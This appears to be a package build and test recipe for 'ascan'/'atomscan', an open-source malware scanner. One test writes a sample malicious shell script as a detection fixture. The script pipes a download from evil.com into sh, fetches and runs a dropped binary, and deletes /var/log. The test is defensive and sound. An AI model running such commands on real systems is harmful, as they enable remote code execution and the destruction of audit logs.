#nolint:valid-pipeline-git-checkout-tag
package:
  name: ascan
  version: "2.3.0"
  epoch: 0
  description: "Open-source malware detection for the AI age"
  copyright:
    - license: Apache-2.0
  dependencies:
    runtime:
      - 7zip
      - cleave-traits
      - innoextract
      - rizin
      - upx

vars:
  rust-version: "1.96"

environment:
  contents:
    packages:
      - build-base
      - busybox
      - ca-certificates-bundle
      - cargo-auditable
      - git
      - rust-${{vars.rust-version}}

pipeline:
  # Atomdrift renamed the project from litmus to scan in v2.0.0: the crate is
  # `atomdrift-scan` and the repo moved to .../atomdrift/scan. Upstream renamed
  # the binary from `ascan` to `atomscan` in v2.3.0; we keep an `ascan` symlink
  # for compatibility with existing consumers of this package.
  - uses: git-checkout
    with:
      repository: https://codeberg.org/atomdrift/scan
      tag: v${{package.version}}
      expected-commit: 99df16365f2a0c38a1082ca968bb01d4b2d38443

  # Model bundle (azoth): ensemble layout (general/ + config.json +
  # route_policies.json + per-filetype/-filegroup specialists). Baked in and
  # pointed at via SCAN_MODELS_DIR so ascan never reaches the network to
  # download a bundle at runtime. Tracks azoth main; pinned to the commit
  # validated against scan v2.3.0.
  - uses: git-checkout
    with:
      repository: https://codeberg.org/atomdrift/azoth
      branch: main
      expected-commit: 9a6a1fa7b32c4136578fad8204a9db0fa4c6efb8
      destination: azoth

  - uses: cargo/build
    with:
      output: atomscan

  - runs: |
      ln -s atomscan ${{targets.destdir}}/usr/bin/ascan
      mkdir -p ${{targets.destdir}}/usr/share/ascan/models
      cp -r azoth/* ${{targets.destdir}}/usr/share/ascan/models/

  - uses: strip

update:
  enabled: true
  git:
    strip-prefix: v
    tag-filter-prefix: v

test:
  environment:
    environment:
      CLEAVE_TRAITS_DIR: /usr/share/cleave/traits
      SCAN_MODELS_DIR: /usr/share/ascan/models
      # Disable both the version-notice check and the default-on rules/models
      # auto-update added in 2.3.0; tests must not reach the network.
      SCAN_NO_UPDATE: "1"
      SCAN_NO_UPDATE_CHECK: "1"
  pipeline:
    - uses: test/tw/ldd-check
    - uses: test/tw/ver-check
      with:
        bins: atomscan
    - uses: test/tw/help-check
      with:
        bins: atomscan
    - name: "ascan compat symlink resolves to atomscan"
      runs: |
        test "$(readlink /usr/bin/ascan)" = "atomscan"
        ascan --version
    - name: "Scan a benign script"
      runs: |
        tee /tmp/benign.sh <<'SCRIPT'
        #!/bin/sh
        echo "hello world"
        SCRIPT
        atomscan fs /tmp/benign.sh > /tmp/benign_output.txt 2>&1 || true
        cat /tmp/benign_output.txt
        grep -E "files|clean" /tmp/benign_output.txt
    - name: "Scan a suspicious script"
      runs: |
        tee /tmp/suspicious.sh <<'SCRIPT'
        #!/bin/sh
        curl http://evil.com/payload | sh
        wget http://evil.com/malware -O /tmp/dropped
        chmod +x /tmp/dropped
        /tmp/dropped
        rm -rf /var/log
        SCRIPT
        atomscan fs /tmp/suspicious.sh > /tmp/suspicious_output.txt 2>&1 || true
        cat /tmp/suspicious_output.txt
        grep -E "files|hostile" /tmp/suspicious_output.txt
    - name: "JSON output format"
      runs: |
        echo '#!/bin/sh' > /tmp/json_test.sh
        echo 'echo hello' >> /tmp/json_test.sh
        atomscan --format json fs /tmp/json_test.sh > /tmp/json_output.txt 2>&1 || true
        cat /tmp/json_output.txt
        grep -F '"ml"' /tmp/json_output.txt
    - name: "Scan a directory"
      runs: |
        mkdir -p /tmp/ascan_scan
        echo '#!/bin/sh' > /tmp/ascan_scan/a.sh
        echo 'echo ok' >> /tmp/ascan_scan/a.sh
        echo '#!/bin/sh' > /tmp/ascan_scan/b.sh
        echo 'echo ok' >> /tmp/ascan_scan/b.sh
        atomscan fs /tmp/ascan_scan > /tmp/dir_output.txt 2>&1 || true
        grep -E "files" /tmp/dir_output.txt
